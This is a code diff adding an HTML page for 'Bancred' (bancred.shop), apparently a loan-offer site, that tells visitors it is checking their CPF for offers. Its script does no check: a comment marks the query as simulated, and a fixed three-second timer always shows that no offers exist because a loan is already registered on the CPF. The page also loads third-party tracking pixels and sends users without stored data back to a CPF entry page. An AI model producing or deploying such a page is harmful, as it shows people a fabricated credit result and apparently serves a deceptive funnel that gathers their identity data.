@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta name="csrf-token" content="yIX2qmMM0ynnQvMkuoYu5dIsCBXnKy4x8iGbL7AW">
+    <title>Consultando Empréstimos - Bancred</title>
+    <meta name="description" content="Consultando ofertas de empréstimo disponíveis">
+    <meta name="keywords" content="emprestimo, consulta, ofertas">
+    <meta name="author" content="Bancred">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+    <meta name="msapplication-navbutton-color" content="#FFFFFF">
+    <link rel="canonical" href="https://bancred.shop">
+    <link rel="shortcut icon" href="../public/images/favicon-9.ico">
+    <link rel="stylesheet" href="../public/build/assets/app-DUxc7Kjs.css">
+    <script type="module" src="../public/build/assets/app-CAiCLEjY.js"></script>
+    <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+    body, html{font-family: "Inter", sans-serif;} button{cursor:pointer;}
+    
+    .spinner {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #2563eb;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    .loading-dots::after {
+        content: '';
+        animation: dots 1.5s steps(4, end) infinite;
+    }
+    
+    @keyframes dots {
+        0%, 20% { content: '.'; }
+        40% { content: '..'; }
+        60%, 100% { content: '...'; }
+    }
+    </style>
+    <script>
+        window.pixelId = "6938cbd059dd67439a0a0a4d";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+</head>
+<body data-id="6936f1d964e99">
+    <div class="min-h-screen bg-gray-50 flex items-center justify-center px-4">
+        <div class="max-w-md w-full">
+            <!-- Tela de Carregamento -->
+            <div id="loadingScreen" class="text-center">
+                <div class="bg-white rounded-3xl shadow-lg p-8 md:p-12">
+                    <div class="mb-6">
+                        <div class="spinner"></div>
+                    </div>
+                    <h2 class="text-2xl font-semibold text-gray-900 mb-2">Consultando CPF<span class="loading-dots"></span></h2>
+                    <p class="text-gray-600">Aguarde enquanto buscamos as melhores ofertas para você</p>
+                </div>
+            </div>
+
+            <!-- Tela de Resultado -->
+            <div id="resultScreen" class="hidden text-center">
+                <div class="bg-white rounded-3xl shadow-lg p-8 md:p-12">
+                    <div class="mb-6">
+                        <div class="w-16 h-16 mx-auto bg-orange-100 rounded-full flex items-center justify-center">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-alert-circle text-orange-600">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <line x1="12" x2="12" y1="8" y2="12"></line>
+                                <line x1="12" x2="12.01" y1="16" y2="16"></line>
+                            </svg>
+                        </div>
+                    </div>
+                    <h2 class="text-2xl font-semibold text-gray-900 mb-4">Nenhuma oferta encontrada</h2>
+                    <p class="text-gray-600 mb-8 leading-relaxed">
+                        Infelizmente não foi possível encontrar ofertas pois existe um empréstimo no seu CPF.
+                    </p>
+                    <button onclick="goBackToAccount()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-6 rounded-xl transition-colors duration-200">
+                        Voltar à Conta
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="../public/js/jquery.min-9.js"></script>
+    <script>
+        const userLogado = sessionStorage.getItem("userData");
+        if (!userLogado) {
+            const isLocal = window.location.hostname === 'localhost' || 
+                          window.location.hostname === '127.0.0.1' ||
+                          window.location.protocol === 'file:';
+            
+            if (isLocal) {
+                const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
+                window.location.href = basePath + '/../cpf.html' + window.location.search;
+            } else {
+                // Função helper para detectar ambiente
+                function getLocalUrl(path) {
+                    const isLocal = window.location.hostname === 'localhost' || 
+                                  window.location.hostname === '127.0.0.1' ||
+                                  window.location.protocol === 'file:';
+                    
+                    if (isLocal) {
+                        const currentPath = window.location.pathname;
+                        const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+                        const cleanPath = path.startsWith('/') ? path.substring(1) : path;
+                        return window.location.origin + basePath + '/' + cleanPath;
+                    } else {
+                        return "https://bancred.shop" + (path.startsWith('/') ? path : '/' + path);
+                    }
+                }
+                window.location.href = getLocalUrl('/cpf.html') + window.location.search;
+            }
+        }
+
+        // Simular consulta ao CPF
+        setTimeout(() => {
+            document.getElementById('loadingScreen').classList.add('hidden');
+            document.getElementById('resultScreen').classList.remove('hidden');
+        }, 3000); // Mostra resultado após 3 segundos
+
+        function goBackToAccount() {
+            const isLocal = window.location.hostname === 'localhost' || 
+                          window.location.hostname === '127.0.0.1' ||
+                          window.location.protocol === 'file:';
+            
+            let urlConta;
+            
+            if (isLocal) {
+                const currentPath = window.location.pathname;
+                const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+                urlConta = basePath + '/../conta.html';
+            } else {
+                urlConta = "https://bancred.shop/conta.html";
+            }
+            
+            window.location.href = urlConta + window.location.search;
+        }
+    </script>
+</body>
+</html>
+
